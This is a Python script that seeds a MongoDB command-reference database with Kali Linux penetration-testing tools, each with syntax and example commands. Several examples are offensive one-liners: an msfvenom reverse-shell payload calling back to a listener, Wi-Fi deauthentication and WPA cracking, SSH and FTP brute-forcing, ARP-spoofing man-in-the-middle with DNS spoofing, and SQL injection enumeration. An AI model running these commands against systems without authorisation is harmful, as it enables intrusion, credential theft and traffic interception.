#!/usr/bin/env python3
"""
Kali Linux Security Tools Database
Essential penetration testing and security tools from Kali Linux
"""

import asyncio
import uuid
from datetime import datetime, timezone
from motor.motor_asyncio import AsyncIOMotorClient

# MongoDB connection
mongo_url = "mongodb://localhost:27017"
db_name = "linux_admin_tool"

# Comprehensive Kali Linux security tools
KALI_SECURITY_TOOLS = [
    # Network Discovery & Scanning
    {
        "name": "nmap",
        "description": "Network exploration tool and security/port scanner",
        "syntax": "nmap [options] [target...]",
        "examples": [
            "nmap -sS 192.168.1.0/24",
            "nmap -sV -p 1-1000 target.com", 
            "nmap -O target.com",
            "nmap --script vuln target.com"
        ],
        "category": "Network Discovery",
        "tags": ["advanced", "security", "scanning", "network", "ports", "kali", "penetration testing", "reconnaissance"]
    },
    {
        "name": "masscan",
        "description": "High-speed port scanner capable of scanning the entire Internet",
        "syntax": "masscan [options] [target...]", 
        "examples": [
            "masscan -p1-65535 192.168.1.0/24 --rate=1000",
            "masscan -p80,8000-8100 10.0.0.0/8",
            "masscan -p443 --rate=10000 0.0.0.0/0",
            "masscan --top-ports 100 192.168.1.0/24"
        ],
        "category": "Network Discovery",
        "tags": ["advanced", "security", "scanning", "network", "ports", "fast", "kali", "penetration testing"]
    },
    {
        "name": "zenmap",
        "description": "Official Nmap Security Scanner GUI",
        "syntax": "zenmap",
        "examples": [
            "zenmap",
            "zenmap --help",
            "zenmap profile_name",
            "zenmap -v"
        ],
        "category": "Network Discovery",
        "tags": ["basic", "security", "scanning", "network", "gui", "nmap", "kali", "penetration testing"]
    },

    # Web Application Security
    {
        "name": "burpsuite",
        "description": "Integrated platform for performing security testing of web applications",
        "syntax": "burpsuite",
        "examples": [
            "burpsuite",
            "java -jar burpsuite_community.jar",
            "burpsuite --help",
            "burpsuite --disable-extensions"
        ],
        "category": "Web Application Security",
        "tags": ["advanced", "security", "web", "proxy", "testing", "gui", "kali", "penetration testing", "burp"]
    },
    {
        "name": "owasp-zap",
        "description": "OWASP Zed Attack Proxy - web application security scanner",
        "syntax": "zaproxy [options]",
        "examples": [
            "zaproxy",
            "zap.sh -daemon -port 8080",
            "zap-baseline.py -t http://example.com",
            "zap-full-scan.py -t http://example.com"
        ],
        "category": "Web Application Security", 
        "tags": ["advanced", "security", "web", "proxy", "scanner", "owasp", "kali", "penetration testing", "zap"]
    },
    {
        "name": "nikto",
        "description": "Web server scanner which performs comprehensive tests",
        "syntax": "nikto [options]",
        "examples": [
            "nikto -h http://target.com",
            "nikto -h 192.168.1.100 -p 80,443",
            "nikto -h target.com -ssl",
            "nikto -h target.com -output nikto_results.txt"
        ],
        "category": "Web Application Security",
        "tags": ["basic", "security", "web", "scanner", "vulnerability", "kali", "penetration testing", "nikto"]
    },
    {
        "name": "dirb",
        "description": "Web content scanner to find existing and hidden files/directories",
        "syntax": "dirb [url] [wordlist] [options]",
        "examples": [
            "dirb http://target.com",
            "dirb http://target.com /usr/share/dirb/wordlists/common.txt",
            "dirb https://target.com -a 'Mozilla/5.0'",
            "dirb http://target.com -X .php,.html"
        ],
        "category": "Web Application Security", 
        "tags": ["basic", "security", "web", "directory", "brute force", "enumeration", "kali", "penetration testing"]
    },
    {
        "name": "dirbuster",
        "description": "Multi threaded java application designed to brute force directories and files",
        "syntax": "dirbuster",
        "examples": [
            "dirbuster",
            "java -jar DirBuster.jar",
            "dirbuster -help",
            "dirbuster -u http://target.com"
        ],
        "category": "Web Application Security",
        "tags": ["basic", "security", "web", "directory", "brute force", "gui", "java", "kali", "penetration testing"]
    },

    # Wireless Security
    {
        "name": "aircrack-ng", 
        "description": "Complete suite of tools to assess WiFi network security",
        "syntax": "aircrack-ng [options] [capture files]",
        "examples": [
            "aircrack-ng -w wordlist.txt capture.cap",
            "aircrack-ng -a2 -b 00:11:22:33:44:55 -w wordlist.txt *.cap",
            "aircrack-ng -1 -a 1 -b 00:11:22:33:44:55 *.cap",
            "aircrack-ng -K -w wordlist.txt capture.cap"
        ],
        "category": "Wireless Security",
        "tags": ["advanced", "security", "wireless", "wifi", "crack", "wpa", "wep", "kali", "penetration testing"]
    },
    {
        "name": "airodump-ng",
        "description": "802.11 packet capture program part of aircrack-ng suite",
        "syntax": "airodump-ng [options] [interface]",
        "examples": [
            "airodump-ng wlan0mon",
            "airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon",
            "airodump-ng -a wlan0mon",
            "airodump-ng --manufacturer wlan0mon"
        ],
        "category": "Wireless Security",
        "tags": ["advanced", "security", "wireless", "wifi", "monitor", "capture", "802.11", "kali", "penetration testing"]
    },
    {
        "name": "aireplay-ng",
        "description": "Packet injector for 802.11 networks part of aircrack-ng suite",
        "syntax": "aireplay-ng [options] [interface]",
        "examples": [
            "aireplay-ng -9 wlan0mon",
            "aireplay-ng -1 0 -a 00:11:22:33:44:55 wlan0mon",
            "aireplay-ng -3 -b 00:11:22:33:44:55 wlan0mon",
            "aireplay-ng -0 1 -a 00:11:22:33:44:55 -c 11:22:33:44:55:66 wlan0mon"
        ],
        "category": "Wireless Security",
        "tags": ["advanced", "security", "wireless", "wifi", "injection", "deauth", "attack", "kali", "penetration testing"]
    },

    # Exploitation Tools
    {
        "name": "metasploit",
        "description": "Penetration testing framework with exploits, payloads, and auxiliary modules",
        "syntax": "msfconsole [options]",
        "examples": [
            "msfconsole",
            "msfconsole -q",
            "msfconsole -r script.rc",
            "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > shell.exe"
        ],
        "category": "Exploitation",
        "tags": ["advanced", "security", "exploitation", "framework", "payload", "metasploit", "kali", "penetration testing"]
    },
    {
        "name": "sqlmap",
        "description": "Automatic SQL injection and database takeover tool",
        "syntax": "sqlmap [options]",
        "examples": [
            "sqlmap -u 'http://target.com/page.php?id=1'",
            "sqlmap -u 'http://target.com/login.php' --data='user=admin&pass=admin'",
            "sqlmap -u 'http://target.com/page.php?id=1' --dbs",
            "sqlmap -u 'http://target.com/page.php?id=1' -D database --tables"
        ],
        "category": "Exploitation",
        "tags": ["advanced", "security", "sql injection", "database", "web", "sqlmap", "kali", "penetration testing"]
    },
    {
        "name": "searchsploit",
        "description": "Command line search tool for Exploit Database",
        "syntax": "searchsploit [options] [search terms]",
        "examples": [
            "searchsploit apache 2.4",
            "searchsploit -m 12345",
            "searchsploit -p 12345",
            "searchsploit --exclude=dos apache"
        ],
        "category": "Exploitation",
        "tags": ["basic", "security", "exploits", "database", "search", "exploit-db", "kali", "penetration testing"]
    },

    # Social Engineering
    {
        "name": "social-engineer-toolkit",
        "description": "Framework designed for social engineering attacks",
        "syntax": "setoolkit",
        "examples": [
            "setoolkit",
            "se-toolkit",
            "python /usr/share/set/setoolkit",
            "setoolkit --help"
        ],
        "category": "Social Engineering",
        "tags": ["advanced", "security", "social engineering", "phishing", "set", "framework", "kali", "penetration testing"]
    },

    # Password Attacks
    {
        "name": "john",
        "description": "John the Ripper password cracker",
        "syntax": "john [options] [password files]",
        "examples": [
            "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt",
            "john --show hashes.txt",
            "john --format=NT hashes.txt",
            "john --incremental hashes.txt"
        ],
        "category": "Password Attacks",
        "tags": ["advanced", "security", "password", "crack", "brute force", "john", "kali", "penetration testing"]
    },
    {
        "name": "hashcat",
        "description": "Advanced password recovery utility supporting many algorithms",
        "syntax": "hashcat [options] [hashfile] [dictionary]",
        "examples": [
            "hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt",
            "hashcat -m 1000 hashes.txt wordlist.txt",
            "hashcat -a 3 -m 0 hash.txt ?a?a?a?a?a?a",
            "hashcat --show hashes.txt"
        ],
        "category": "Password Attacks", 
        "tags": ["advanced", "security", "password", "crack", "gpu", "hash", "hashcat", "kali", "penetration testing"]
    },
    {
        "name": "hydra",
        "description": "Parallelized login cracker supporting numerous protocols",
        "syntax": "hydra [options] [target] [service]",
        "examples": [
            "hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.100 ssh",
            "hydra -L users.txt -P passwords.txt ftp://192.168.1.100",
            "hydra -l admin -p password 192.168.1.100 http-get /admin/",
            "hydra -C credentials.txt 192.168.1.100 ssh"
        ],
        "category": "Password Attacks",
        "tags": ["advanced", "security", "password", "brute force", "network", "hydra", "kali", "penetration testing"]
    },
    {
        "name": "medusa",
        "description": "Speedy, parallel, and modular login brute-forcer",
        "syntax": "medusa [options]",
        "examples": [
            "medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh",
            "medusa -H hosts.txt -U users.txt -P passwords.txt -M ftp",
            "medusa -h 192.168.1.100 -u admin -p password -M telnet",
            "medusa -h 192.168.1.100 -C combo.txt -M http"
        ],
        "category": "Password Attacks",
        "tags": ["advanced", "security", "password", "brute force", "modular", "medusa", "kali", "penetration testing"]
    },

    # Forensics & Analysis
    {
        "name": "volatility",
        "description": "Advanced memory forensics framework",
        "syntax": "volatility [options] [plugin]",
        "examples": [
            "volatility -f memory.dump imageinfo",
            "volatility -f memory.dump --profile=Win7SP1x64 pslist",
            "volatility -f memory.dump --profile=Win7SP1x64 netscan",
            "volatility -f memory.dump --profile=Win7SP1x64 malfind"
        ],
        "category": "Digital Forensics",
        "tags": ["advanced", "security", "forensics", "memory", "analysis", "volatility", "kali", "incident response"]
    },
    {
        "name": "autopsy",
        "description": "Digital forensics platform and GUI for The Sleuth Kit",
        "syntax": "autopsy",
        "examples": [
            "autopsy",
            "autopsy --help",
            "autopsy &",
            "java -jar autopsy.jar"
        ],
        "category": "Digital Forensics",
        "tags": ["basic", "security", "forensics", "gui", "disk", "analysis", "autopsy", "kali", "incident response"]
    },

    # Information Gathering
    {
        "name": "recon-ng",
        "description": "Full-featured reconnaissance framework designed with modularity",
        "syntax": "recon-ng [options]",
        "examples": [
            "recon-ng",
            "recon-ng -w workspace_name",
            "recon-ng -r script.rc",
            "recon-ng --no-check"
        ],
        "category": "Information Gathering",
        "tags": ["advanced", "security", "reconnaissance", "osint", "framework", "recon", "kali", "penetration testing"]
    },
    {
        "name": "theharvester",
        "description": "Gather emails, subdomains, hosts, employee names from different sources",
        "syntax": "theharvester [options]",
        "examples": [
            "theharvester -d example.com -l 500 -b google",
            "theharvester -d example.com -b all",
            "theharvester -d example.com -l 200 -b linkedin",
            "theharvester -d example.com -b shodan"
        ],
        "category": "Information Gathering", 
        "tags": ["basic", "security", "reconnaissance", "osint", "email", "subdomain", "kali", "penetration testing"]
    },
    {
        "name": "maltego",
        "description": "Interactive data mining tool for link analysis and data visualization",
        "syntax": "maltego",
        "examples": [
            "maltego",
            "maltego --help",
            "maltego -Xmx2g",
            "maltego &"
        ],
        "category": "Information Gathering",
        "tags": ["advanced", "security", "reconnaissance", "osint", "visualization", "gui", "kali", "penetration testing"]
    },
    {
        "name": "shodan",
        "description": "Command-line interface for Shodan search engine",
        "syntax": "shodan [command] [options]",
        "examples": [
            "shodan search apache",
            "shodan host 8.8.8.8", 
            "shodan count apache",
            "shodan download --limit 1000 apache apache-results.json.gz"
        ],
        "category": "Information Gathering",
        "tags": ["basic", "security", "reconnaissance", "osint", "iot", "search", "kali", "penetration testing"]
    },

    # Sniffing & Spoofing
    {
        "name": "wireshark",
        "description": "Network protocol analyzer and packet capture tool",
        "syntax": "wireshark [options] [capture files]",
        "examples": [
            "wireshark",
            "wireshark capture.pcap",
            "wireshark -i eth0",
            "wireshark -k -i eth0"
        ],
        "category": "Sniffing & Spoofing",
        "tags": ["basic", "security", "network", "packet", "capture", "analysis", "gui", "kali", "forensics"]
    },
    {
        "name": "tcpdump", 
        "description": "Command-line packet analyzer and network monitoring tool",
        "syntax": "tcpdump [options] [expression]",
        "examples": [
            "tcpdump -i eth0",
            "tcpdump -i eth0 -w capture.pcap",
            "tcpdump -i eth0 port 80",
            "tcpdump -i eth0 host 192.168.1.100"
        ],
        "category": "Sniffing & Spoofing",
        "tags": ["basic", "security", "network", "packet", "capture", "monitoring", "kali", "forensics"]
    },
    {
        "name": "ettercap",
        "description": "Comprehensive suite for man-in-the-middle attacks",
        "syntax": "ettercap [options] [target1] [target2]",
        "examples": [
            "ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//",
            "ettercap -G",
            "ettercap -T -q -F password.ef -M arp:remote /192.168.1.0/24//",
            "ettercap -T -M arp:remote -P dns_spoof /192.168.1.1// /192.168.1.100//"
        ],
        "category": "Sniffing & Spoofing",
        "tags": ["advanced", "security", "mitm", "arp", "spoofing", "sniffing", "kali", "penetration testing"]
    },

    # Vulnerability Analysis
    {
        "name": "openvas",
        "description": "Full-featured vulnerability scanner",
        "syntax": "openvas-start",
        "examples": [
            "openvas-start", 
            "openvas-stop",
            "openvas-check-setup",
            "greenbone-security-assistant"
        ],
        "category": "Vulnerability Analysis",
        "tags": ["advanced", "security", "vulnerability", "scanner", "assessment", "openvas", "kali", "audit"]
    },
    {
        "name": "nessus",
        "description": "Comprehensive vulnerability scanner",
        "syntax": "/bin/systemctl start nessusd",
        "examples": [
            "systemctl start nessusd",
            "systemctl stop nessusd", 
            "systemctl status nessusd",
            "/opt/nessus/sbin/nessuscli"
        ],
        "category": "Vulnerability Analysis",
        "tags": ["advanced", "security", "vulnerability", "scanner", "commercial", "nessus", "kali", "audit"]
    },

    # Reporting Tools
    {
        "name": "dradis",
        "description": "Collaboration and reporting platform for security teams",
        "syntax": "dradis-webapp",
        "examples": [
            "dradis-webapp",
            "bundle exec rails server",
            "dradis-webapp --help",
            "systemctl start dradis"
        ],
        "category": "Reporting",
        "tags": ["basic", "security", "reporting", "collaboration", "web", "dradis", "kali", "documentation"]
    }
]

async def add_kali_tools():
    """Add Kali Linux security tools to the existing database"""
    
    # Connect to MongoDB
    client = AsyncIOMotorClient(mongo_url)
    db = client[db_name]
    
    print(f"Connected to MongoDB: {db_name}")
    
    # Check existing commands count
    existing_count = await db.commands.count_documents({})
    print(f"Existing commands: {existing_count}")
    
    # Create a system user for these commands
    system_user_id = "system-kali-tools"
    
    # Insert new Kali tools
    commands_to_insert = []
    for cmd_data in KALI_SECURITY_TOOLS:
        # Check if command already exists
        existing = await db.commands.find_one({"name": cmd_data["name"]})
        if not existing:
            command = {
                "id": str(uuid.uuid4()),
                "name": cmd_data["name"],
                "description": cmd_data["description"],
                "syntax": cmd_data["syntax"],
                "examples": cmd_data["examples"],
                "category": cmd_data["category"],
                "tags": cmd_data["tags"],
                "created_by": system_user_id,
                "is_public": True,
                "created_at": datetime.now(timezone.utc),
                "updated_at": datetime.now(timezone.utc)
            }
            commands_to_insert.append(command)
        else:
            print(f"Command '{cmd_data['name']}' already exists, skipping...")
    
    if commands_to_insert:
        # Insert new commands
        result = await db.commands.insert_many(commands_to_insert)
        print(f"✅ Successfully inserted {len(result.inserted_ids)} new Kali tools!")
    else:
        print("No new commands to insert.")
    
    # Display summary by category
    print("\n📊 New Kali tools by category:")
    categories = {}
    for cmd in commands_to_insert:
        cat = cmd["category"]
        categories[cat] = categories.get(cat, 0) + 1
    
    for category, count in sorted(categories.items()):
        print(f"  • {category}: {count} commands")
    
    # Final count
    final_count = await db.commands.count_documents({})
    print(f"\n📈 Total commands in database: {final_count}")
    
    # Close connection
    client.close()
    print("\n🎉 Kali Linux security tools added successfully!")
    
    return len(commands_to_insert)

if __name__ == "__main__":
    asyncio.run(add_kali_tools())